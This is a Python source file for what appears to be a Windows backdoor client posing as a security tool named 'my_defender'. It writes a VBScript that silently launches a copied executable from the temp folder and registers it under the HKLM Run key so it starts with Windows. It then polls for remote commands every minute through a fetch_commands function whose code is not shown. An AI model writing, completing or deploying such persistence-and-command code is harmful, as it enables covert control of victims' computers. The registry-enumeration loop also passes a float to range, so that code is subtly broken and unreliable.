import schedule
import time
from utils import *
import os
import tempfile
from winreg import *


EXE_LOC = tempfile.gettempdir() + "\\mydefender-setup.exe"
VBS_LOC = tempfile.gettempdir() + "\\mydefender-setup.vbs"


def init():
    # Check for file locations
    if not os.path.exists(EXE_LOC) and not os.path.exists(VBS_LOC):
        payload = 'Set WshShell = WScript.CreateObject("WScript.Shell")\nWshShell.Run """{0}""", 0 , false'.format(EXE_LOC)
        with open(VBS_LOC, 'w') as f:
            f.write(payload)
        os.system('copy %s %s'%("mydefender-setup.exe", EXE_LOC))

    # Add persistance
    key = OpenKey(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run")

    was_found = False
    for i in range(0, 10e99):
        try:
            kv = EnumValue(key, i)[0]
            if kv == "my_defender":
                was_found = True
                break
        except:
            pass

    if not was_found:
        new_key = OpenKey(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
        SetValueEx(new_key, "my_defender", 0, REG_SZ, VBS_LOC)
        new_key.Close()

    # Close the Run key
    key.Close()


def main():
    init()

    schedule.every(1).minutes.do(fetch_commands)
    while True:
        schedule.run_pending()
        time.sleep(1)

    
if __name__ == '__main__':
    main()